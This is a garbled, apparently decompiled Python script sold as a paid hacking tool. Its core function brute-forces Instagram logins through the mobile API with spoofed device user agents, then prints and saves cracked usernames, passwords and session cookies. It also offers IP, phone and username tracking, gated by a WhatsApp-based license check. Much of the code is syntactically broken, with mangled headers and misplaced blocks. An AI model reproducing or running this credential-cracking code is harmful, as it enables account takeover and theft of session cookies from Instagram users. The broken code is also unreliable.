0.0.25.116,132.0.0.26.134,117.0.0.28.123,123.0.0.21.114,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,126.0.0.25.121,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,104.0.0.21.118,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,125.0.0.20.126,132.0.0.26.134,132.0.0.26.134,128.0.0.19.128,132.0.0.26.134,121.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,122.0.0.29.238,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,131.0.0.25.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,128.0.0.26.128,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,123.0.0.21.114,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,133.0.0.32.120,123.0.0.21.114,133.0.0.32.120,131.0.0.23.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,133.0.0.32.120,111.1.0.25.152,133.0.0.32.120,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,130.0.0.31.121,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,87.0.0.18.99,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,97.0.0.32.119,131.0.0.25.116,129.0.0.29.119,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,111.1.0.25.152,129.0.0.29.119,134.0.0.26.121,131.0.0.25.116,134.0.0.26.121,134.0.0.26.121,84.0.0.21.105,127.0.0.30.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,80.0.0.14.110,133.0.0.32.120,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,102.0.0.20.117,131.0.0.23.116,131.0.0.25.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,102.0.0.20.117,80.0.0.14.110,87.0.0.18.99,134.0.0.26.121,93.1.0.19.102,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,96.0.0.28.114,129.0.0.29.119,131.0.0.25.116,131.0.0.23.116,135.0.0.15.119,124.0.0.17.473,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,131.0.0.25.116,131.0.0.23.116,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,130.0.0.31.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,131.0.0.23.116,104.0.0.21.118,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,127.0.0.30.121,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,133.0.0.32.120,123.0.0.21.114,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,84.0.0.21.105,131.0.0.23.116,133.0.0.32.120,128.0.0.26.128,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121'
    igve = igv.split(',')
    versi = random.choice(igve)
    sam = rc(['mt6768', 'qcom', 'mt6765', 'mt8768', 'mt6893', 'mt6735', 'mt6752', 'sc8830', 'mt6580', 'mt6735'])
    uas1 = f'Instagram {versi} Android ({android_version}; {dpis}; {pxl}; ZTE; ZTE BLADE A512; P817E52; qcom; {language}; {kode})'
    uas2 = f'Instagram {versi} Android ({android_version}; {dpis}; {pxl}; WIKO; HARRY; v3953; mt6735; {language}; {kode})'
    uas3 = f'Instagram {versi} Android ({android_version}; {dpis}; {pxl}; samsung; SM-G361H; coreprimeve3g; sc8830; {language}; {kode})'
    uas4 = f'Instagram {versi} Android ({android_version}; {dpis}; {pxl}; LeMobile/LeEco; Le X527; le_s2_ww; qcom; {language}; {kode})'
    uas5 = f'Instagram {versi} Android ({android_version}; {dpis}; {pxl}; Xiaomi; Redmi 5 Plus; vince; qcom; {language}; {kode})'
    baseReturn = random.choice([uas1, uas2, uas3, uas4, uas5])
    return baseReturn

def Crack_w(username, memek):
    global Ok  
    global Loop  
    global Cp  
    current_time = time.strftime('%H:%M:%S')
    (sys.stdout.write(f'\r{P}[{V} Processing {P}] {Gr}{Loop}{P} : UID[{H}{str(len(Uuid))}{P}] SUCCES:-[{Gr}{Ok}{P}]/CHEKPOINT:-[{K}{Cp}{P}]'),)
    sys.stdout.flush()
    for password in memek:
        try:
            ses = requests.Session()
            uag = UserAgentBarcelona()
            device_id, family_device_id = (str(uuid.uuid4()), str(uuid.uuid4()))
            _hash = hashlib.md5()
            _hash.update(username.encode('utf-8') + password.encode('utf-8'))
            hex_ = _hash.hexdigest()
            _hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
            ses.headers.update({'x-fb-http-engine': 'Liger', 'Host': 'i.instagram.com', 'x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73', 'x-ig-capabilities': '3brTv10=', 'x-ig-device-id': device_id, 'x-tigon-is-retry': 'True, True', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'x-ig-connection-type': 'MOBILE(LTE)', 'connection': 'keep-alive', 'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)), 'x-ig-www-claim': '0', 'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)), 'x-ig-mapped-locale': 'id_ID', 'x-pigeon-rawclienttime': '{:.6f}'.format(time.x-ig-app-locale()), 'in_ID': f'x-ig-bandwidth-speed-kbps{str(-time.2500000())}', '2500000': '3000000', '1000': 'user-agent', 'uag': 'family_device_id', 'False': 'MOBILE.LTE', 'True': 'id-ID, en-US', '3419628305025917': 'android-', '_hash': 'hexdigest
            data = f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&                      bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73'
            response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=data, allow_redirects=True)
            if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '\"pk_id\":' in str(response.text.replace('\\', '')):
                pass  
        except requests.exceptions.ConnectionError:
            else:  
                try:
                    ig_set_authorization = re.search('\"IG-Set-Authorization\": \"(.*?)\"', str(response.text.replace('\\', ''))).group(1)
                except Exception as e:
                    pass  
                else:  
                    try:
                        decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
                        cookies = ';'.join([str(x) + '=' + str(y) for x, y in decode_ig_set_authorization.items()])
                        finally:  
                            Ok += 1
                            post, peng, meng, mail, fullname, fbid, phone = data_target(username)
                            print('                                                               ', end='\r')
                            time.sleep(0.1)
                            print(f'{Wh}[ {Gr}✓ {Wh}] {Gr} SUCCESFULLY STATUS')
                            print(f'{Wh}[ {Gr}✓ {Wh}] {Gr}ACCOUNT: {fullname[:10]}')
                            print(f'{Wh}[ {Gr}✓ {Wh}] {Gr} USERNAME: {username}')
                            print(f'{Wh}[ {Gr}✓ {Wh}] {Gr} PASSWORD: {password}')
                            print(f'{Wh}[ {Gr}✓ {Wh}] {Gr} MENGIKUTI: {meng}')
                            print(f'{Wh}[ {Gr}✓ {Wh}] {Gr}PENGGIKUT: {peng}')
                            print(f'{Wh}[ {Gr}✓ {Wh}] {Gr}POSTINGAN: {post}')
                            print(f'{Wh}[ {Gr}✓ {Wh}] {Gr} COOKIES: {cookies}')
                            open('Ress/Ok-instagram.txt', 'a').write(f'{username}|{password}\n{peng}|{meng}\n{cookies}\n')
                        else:  
                            break
            else:  
                if 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
                    Cp += 1
                    post, peng, meng, mail, fullname, fbid, phone = data_target(username)
                    print('                                                               ', end='\r')
                    time.sleep(0.1)
                    print(f'{Wh}[ {K}× {Wh}] {K} CHEKPOINT STATUS')
                    print(f'{Wh}[ {K}× {Wh}] {K}ACCOUNT: {fullname[:10]}')
                    print(f'{Wh}[ {K}× {Wh}] {K} USERNAME: {username}')
                    print(f'{Wh}[ {K}× {Wh}] {K} PASSWORD: {password}')
                    print(f'{Wh}[ {K}× {Wh}] {K} MENGIKUTI: {meng}')
                    print(f'{Wh}[ {K}× {Wh}] {K}PENGGIKUT: {peng}')
                    print(f'{Wh}[ {K}× {Wh}] {K}POSTINGAN: {post}')
                    print(f'{Wh}[ {K}× {Wh}] {K}USER-AGENT: {uag}')
                    open('Ress/Cp-Instagram.txt', 'a').write('%s|%s\n' % (username, password))
                else:  
                    break
                if 'ip_block' in str(response.text.replace('\\', '')):
                    print(f'\rstatus ip: {M}spam{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}', end='')
                else:  
                    if 'Please wait a few' in str(response.text.replace('\\', '')) or 'Harap tunggu beberapa' in str(response.text.replace('\\', '')):
                        print('                                                               ', end='\r')
                        time.sleep(0.1)
                        print('Harap tunggu beberapa menit', end='\r')
                        time.sleep(0.1)
                    else:  
                        if 'Unmapped IG Error' in str(response.text.replace('\\', '')) or 'This IG Error was not mapped to an Error Code.' in str(response.text.replace('\\', '')):
                            sys.stdout.write(f'\rstatus ip: {M}spam{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}')
        ig_set_authorization = None
        time.sleep(20)

def lapor_bug():
    print('=== Lapor Masalah / Bug ===')
    nama = input('Nama Anda: ')
    deskripsi = input('Deskripsikan masalah/bug yang Anda alami: ')
    nomor_wa = '+6283198722330'
    pesan = f'Halo admin, saya {nama} ingin melaporkan bug:\n{deskripsi}'
    encoded_message = urllib.parse.quote(pesan)
    url = f"https://wa.me/{nomor_wa.replace('+', '')}?text={encoded_message}"
    print('\nMembuka WhatsApp...')
    os.system(f'xdg-open \"{url}\"')
    sys.exit(3)
options = [{'num': 1, 'text': 'Locations IP infomation', 'func': IP_Track}, {'num': 2, 'text': 'Show andress you', 'func': showIP}, {'num': 3, 'text': 'Number information', 'func': phoneGW}, {'num': 4, 'text': 'Search username', 'func': TrackLu}, {'num': 5, 'text': 'Bruteforce Instagram', 'func': Menu}, {'num': 6, 'text': 'Report bug', 'func': lapor_bug}, {'num': 0, 'text': 'Exit', 'func': exit}]

def main():
    clear()
    option()
    time.sleep(1)
    try:
        opt = int(input(f'{Wh}\n [ + ] {Gr}Select Option : {Wh}'))
        execute_option(opt)
    except ValueError:
        print(f'\n{Wh}[ {Re}! {Wh}] {Re}Please input number')
        time.sleep(2)
        main()

def generate_device_id():
    try:
        system_info = {'euid': os.geteuid(), 'username': os.getlogin(), 'hostname': os.uname().nodename, 'machine': os.uname().machine}
        unique_string = f"{system_info['euid']}-{system_info['username']}-{system_info['hostname']}-{system_info['machine']}"
        return hashlib.sha256(unique_string.encode()).hexdigest()
    except Exception as e:
        print(f'[1;31mError generating device ID: {e}[0m')
        sys.exit(1)

def check_github_approval(device_id):
    try:
        github_url = 'https://raw.githubusercontent.com/ZAXXYDEVEN/BruteGmail/refs/heads/main/License.txt'
        headers = {'Cache-Control': 'no-cache', 'Pragma': 'no-cache'}
        response = requests.get(github_url, headers=headers, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f'[1;31mError mengakses GitHub: {e}[0m')
        return False
    except Exception as e:
        print(f'[1;31mError tidak terduga: {e}[0m')
        return False
    else:  
        pass

def show_approval_menu(device_id):
    os.system('clear' if os.name == 'posix' else 'cls')
    print('[1;32m')
    print('\n\n _       _________ _______  _______  _        _______  _______ \n( \\      \\__   __/(  ____ \\(  ____ \\( (    /|(  ____ \\(  ____ \\\n| (         ) (   | (    \\/| (    \\/|  \\  ( || (    \\/| (    \\/\n| |         | |   | |      | (__    |   \\ | || (_____ | (__    \n| |         | |   | |      |  __)   | (\\ \\) |(_____  )|  __)   \n| |         | |   | |      | (      | | \\   |      ) || (      \n| (____/\\___) (___| (____/\\| (____/\\| )  \\  |/\\____) || (____/\\\n(_______/\\_______/(_______/(_______/|/    )_)\\_______)(_______/                                                               \n    ')
    print(f'{Wh}[ AUTHOR ]{Gr}  Z A X X Y D E V E N {Wh}')
    print(f'{Wh}[ INFORMASION]{Gr}  HACKING BRUTEFORCE AND TRACKING OSINT {Wh}')
    print(f'[1;97mDevice ID Anda / Your Device ID: [1;36m{device_id}[0m')
    print('[1;97m----------------------------------------------')
    print('[1;33m[Petunjuk - Bahasa Indonesia]')
    print('[1;97m1.Hubungi saya')
    print('2. Salin Device ID di atas')
    print('3. Kirim ke pemilik SK untuk verifikasi')
    print('[1;31mCatatan: Layanan ini berbayar, tidak gratis')
    print('\n[1;33m[Instructions - English]')
    print('[1;97m1.Contacts me')
    print('2. Copy the Device ID above')
    print('3. Send it to the script owner for verification')
    print('[1;31mNote: This is a paid service, not free')
    print('[1;97m==============================================[0m')
    input('\nTekan ENTER untuk buka link verifikasi... /Press ENTER to open verification link... ')
    nomor_admin = '6283198722330'
    pesan = f'Halo kak saya mau buy script nya ini key saya : {device_id}'
    encoded_pesan = urllib.parse.quote(pesan)
    link_wa = f'https://wa.me/{nomor_admin}?text={encoded_pesan}'
    os.system(f'xdg-open \"{link_wa}\"')
    time.sleep(2)
    sys.exit()
os.system('clear' if os.name == 'posix' else 'cls')
print('[1;34mMemeriksa lisensi...[0m')
time.sleep(1)
device_id = generate_device_id()
if check_github_approval(device_id):
    print('[1;32mStatus: TERVERIFIKASI[0m')
    time.sleep(1)
    main()
else:  
    print('[1;31mStatus: BELUM TERVERIFIKASI[0m')
    time.sleep(1)
    show_approval_menu(device_id)
if __name__ == '__main__':
    os.mkdir('Ress')
except:
    pass
else:  
    os.mkdir('Data')
except:
    pass
else:  
    try:
        main()
    except KeyboardInterrupt:
        pass  
    print(f'\n{Wh}[ {Re}! {Wh}] {Re}Exit')
    time.sleep(2)
    exit()
